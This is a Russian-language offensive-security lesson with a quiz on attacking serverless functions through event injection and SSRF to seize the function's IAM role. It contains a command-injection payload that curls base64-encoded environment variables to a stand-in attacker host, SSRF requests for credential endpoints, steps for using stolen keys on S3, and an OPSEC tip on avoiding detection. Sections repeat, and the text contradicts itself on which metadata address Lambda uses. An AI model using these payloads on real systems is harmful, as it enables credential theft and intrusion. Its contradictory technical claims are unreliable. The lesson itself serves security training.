---
id: cloud-serverless
title: "Serverless (FaaS): инъекции в события и захват роли функции"
category: cloud
parent: cloud-iam-attack
difficulty: medium
order: 2
tags: [cloud, serverless, lambda, functions, faas, iam, injection]
prerequisites: [cloud-iam-basics, cloud-metadata-ssrf]
useful_for:
  - "Атаки на Lambda / Cloud Functions / Azure Functions"
  - "Понимание IAM-роли как главного приза в FaaS"
  - "Bug bounty и CTF по serverless-приложениям"
estimated_minutes: 45
summary: "В serverless нет сервера — атакуем событие, код и, главное, IAM-роль функции. Разбираем event injection, переменные окружения, злоупотребление execution role и типовые мисконфиги триггеров."
---

Serverless убирает сервер, но не убирает поверхность атаки. Функция принимает событие от множества источников (HTTP, очередь, бакет, cron) и работает с правами **execution role**. Главный приз — не сама функция, а её роль. Урок про инъекции в события и захват роли.

## Как устроен FaaS и где приз

Три платформы и их роли:

| Платформа | Сервис | Роль функции |
|-----------|--------|--------------|
| AWS | Lambda | Execution role (STS-токен в env) |
| GCP | Cloud Functions / Run | Service account |
| Azure | Functions | Managed Identity / App Service identity |

Ключевой факт: у каждой функции есть **временные креды**, доступные коду. Если злоумышленник исполняет код в функции (или читает её env), он получает эти креды.

```bash
# Внутри AWS Lambda — временные креды доступны как переменные окружения
echo $AWS_ACCESS_KEY_ID $AWS_SECRET_ACCESS_KEY $AWS_SESSION_TOKEN
# и через metadata-like endpoint (Lambda Runtime API)
curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
```

## Источники событий как поверхность

Функцию вызывают разные источники, и каждый — потенциальный вход:

- **API Gateway / Function URL** — прямой HTTP-вход.
- **S3 event** — имя объекта из события может попасть в код (path traversal, SSRF).
- **SQS/SNS** — тело сообщения часто парсится как JSON.
- **DynamoDB Streams** — данные из таблицы.
- **CloudWatch Events / cron** — периодические запуски.

```bash
# Найти все функции и их триггеры
aws lambda list-functions --query 'Functions[].FunctionName'
aws lambda get-policy --function-name <fn>       # resource-based policy
aws lambda get-function-url-config --function-name <fn>
aws apigateway get-rest-apis
```

## Event injection: от события к RCE/SSRF

Код функции парсит событие. Если он делает это небезопасно — инъекция.

**Command injection** через поле события:

```python
# уязвимый код
import subprocess
def handler(event, context):
    name = event["queryStringParameters"]["file"]
    return subprocess.check_output(f"cat /tmp/{name}", shell=True)
```

Полезная нагрузка в query-параметре:

```bash
curl 'https://<fn-url>/?file=x;id'
curl 'https://<fn-url>/?file=x;curl http://attacker/$(env|base64)'
```

**SSRF** через URL из события:

```python
# уязвимый код
import urllib.request
def handler(event, context):
    url = event["url"]
    return urllib.request.urlopen(url).read()
```

Через SSRF в Lambda можно дойти до metadata/creds:

```bash
curl 'https://<fn-url>/?url=http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI'
```

**Deserialization / JSON injection** — когда событие десериализуется в объект.

## Злоупотребление execution role

Если функция исполняет код, доступный атакующему, или если злоумышленник может **обновить код функции** — роль становится его ролью.

```bash
# Проверить, какие права у роли функции
aws lambda get-function-configuration --function-name <fn> \
  --query 'Role'
aws iam list-attached-role-policies --role-name <role>
aws iam list-role-policies --role-name <role>

# Эксфильтрация временных кредов из функции
aws sts get-caller-identity
aws s3 ls
```

Опасные права роли: `s3:*`, `dynamodb:*`, `secretsmanager:GetSecretValue`, `iam:PassRole`, `lambda:InvokeFunction`.

## Разобранный пример: SSRF в Lambda → доступ к S3

**Дано:** Function URL, принимающий `url` и делающий fetch.

1. Тестируем SSRF:

```bash
curl 'https://fn.example/?url=http://169.254.169.254/latest/meta-data/'
# Lambda НЕ использует 169.254.169.254 — вместо этого 169.254.170.2
curl "https://fn.example/?url=http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
```

2. Получаем JSON с `AccessKeyId`, `SecretAccessKey`, `Token`.
3. Настраиваем профиль и проверяем:

```bash
export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...
aws sts get-caller-identity
aws s3 ls
```

4. Роль функции часто имеет доступ к бакету с данными — читаем.

## Переменные окружения и слои

Env-переменные функции видны любому, кто может `GetFunctionConfiguration`:

```bash
aws lambda get-function-configuration --function-name <fn> \
  --query 'Environment.Variables'
```

Часто там API-ключи, строки подключения, пароли. **Слои (Layers)** — общие библиотеки; отравленный слой влияет на все функции, которые его используют (см. `cloud-lambda-privesc`).

## Частые ошибки

- **Искать 169.254.169.254 в Lambda.** Для Lambda другой endpoint: `169.254.170.2` (или `AWS_CONTAINER_CREDENTIALS_FULL_URI`).
- **Считать, что роль функции «слабая».** Часто у неё широкие права на сервисы.
- **Забывать про Function URL.** Он может быть публичным без API Gateway.
- **Игнорировать env.** Там лежат секреты в открытом виде.
- **Не проверять resource-based policy.** Она показывает, кто может вызывать функцию.
- **Путать execution role и role вызывающего.** Это разные права.

## Что дальше / решение

- Есть SSRF → тяните креды из runtime endpoint.
- Есть возможность `UpdateFunctionCode` → залейте свой код и используйте роль.
- Есть `iam:PassRole` + `CreateFunction`/`UpdateFunctionConfiguration` → эскалация (см. `cloud-lambda-privesc`).
- Смежные уроки: `cloud-serverless-injection`, `cloud-lambda-privesc`, `cloud-metadata-ssrf`.

## Event injection: детали

Функция обрабатывает события (S3, SQS, API Gateway, DynamoDB). Если входные данные попадают в опасные вызовы (shell, SQL, SSRF) — событие становится вектором. Пример SSRF в Lambda: код делает `requests.get(url)` из параметра события — можно обратиться к metadata (IMDS) и получить роль функции.

```python
import urllib.request
def handler(event, ctx):
    url = event["url"]
    return urllib.request.urlopen(url).read().decode()
# event {"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
```

## Злоупотребление execution role

Роль функции — то, чем она может пользоваться. Часто она шире, чем нужно: доступ к S3, DynamoDB, Secrets. Компрометировав функцию (injection), вы получаете её роль. Проверяйте `aws lambda get-function-configuration --function-name X --query Role`.

## Переменные окружения и слои

Env функции видны через `get-function-configuration` (если есть права) и содержат секреты. Слои — код, разделяемый между функциями; подмена слоя заражает всех, кто его использует.

## Практическое задание

Разверните Lambda с SSRF и ролью с доступом к S3. Через событие обратитесь к IMDS, получите креды роли и прочитайте бакет. Затем ограничьте роль минимально необходимым и повторите — доступ должен сузиться. Это ключевой навык анализа serverless-безопасности.

## Почему serverless меняет модель

В FaaS нет сервера, за который отвечает клиент, — вся поверхность смещается в код и в execution role. Инъекция в событие даёт выполнение кода, а роль функции определяет, насколько далеко можно зайти. Поэтому аудит serverless — это в первую очередь чтение роли функции и анализ источников событий на предмет injection.

## Чек-лист

1. Найти функции и их триггеры (S3, SQS, API GW, DynamoDB).
2. Прочитать код (если есть) — искать инъекции и SSRF.
3. Проверить execution role — насколько она широка.
4. Протестировать event injection (SSRF/command) в изолированной среде.
5. Через роль функции двигаться к ресурсам (S3, Secrets, БД).
6. Для защиты — least privilege роли, валидация событий, IMDSv2.

## Источники событий

S3 (ObjectCreated), SQS/SNS, API Gateway, DynamoDB Streams, EventBridge, CloudWatch Logs. Каждый источник — потенциальный вход. S3-событие с именем файла, попадающим в shell, — command injection. API Gateway с телом в SQL — инъекция. SQS с десериализацией — RCE. Анализируйте все триггеры, а не только HTTP.

## Тайм-аут и стоимость как ограничения

У Lambda есть тайм-аут (до 15 мин) и лимит памяти. При SSRF-эксфильтрации учитывайте это: длинные выгрузки могут не успеть. Используйте внешние хранилища (S3) для сбора. Также помните о биллинге: массовые вызовы заметны по стоимости и могут привлечь внимание — это часть OPSEC.

## Квиз

```quiz
- question: "Какой endpoint отдаёт временные креды внутри AWS Lambda?"
  options:
    - "169.254.170.2 (Lambda Runtime API)"
    - "169.254.169.254"
    - "127.0.0.1:8080"
    - "8.8.8.8"
  answer: 0
  explanation: "Lambda использует 169.254.170.2, а не EC2 metadata."
- question: "Что является главным призом при атаке на serverless-функцию?"
  options:
    - "Её execution role и доступные ей права"
    - "Логотип функции"
    - "Название региона"
    - "Таймаут функции"
  answer: 0
  explanation: "Роль определяет доступ к облачным ресурсам."
- question: "Где в Lambda часто лежат секреты в открытом виде?"
  options:
    - "В переменных окружения функции"
    - "В поле runtime"
    - "В memorySize"
    - "В архитектуре"
  answer: 0
  explanation: "Environment.Variables видны через GetFunctionConfiguration."
- question: "Что такое Function URL?"
  options:
    - "Публичный HTTPS-эндпоинт функции без API Gateway"
    - "Внутренний DNS кластера"
    - "Тип роли IAM"
    - "Формат логов"
  answer: 0
  explanation: "Function URL даёт прямой HTTP-доступ к Lambda."
- question: "Как SSRF в функции превращается в захват роли?"
  options:
    - "Чтением временных кредов из runtime endpoint"
    - "Отправкой email"
    - "Изменением цвета консоли"
    - "Перезагрузкой функции"
  answer: 0
  explanation: "Креды из runtime endpoint = права execution role."
```

## Где пригодится

- **Bug bounty:** SSRF и инъекции в serverless-приложениях.
- **Пентест:** оценка FaaS-поверхности и прав функций.
- **CTF:** задачи с Lambda/Cloud Functions и захватом роли.
- **Работа/DevSecOps:** least-privilege для execution role, вынос секретов из env.
- **Дальше по дереву:** `cloud-serverless-injection`, `cloud-lambda-privesc`.
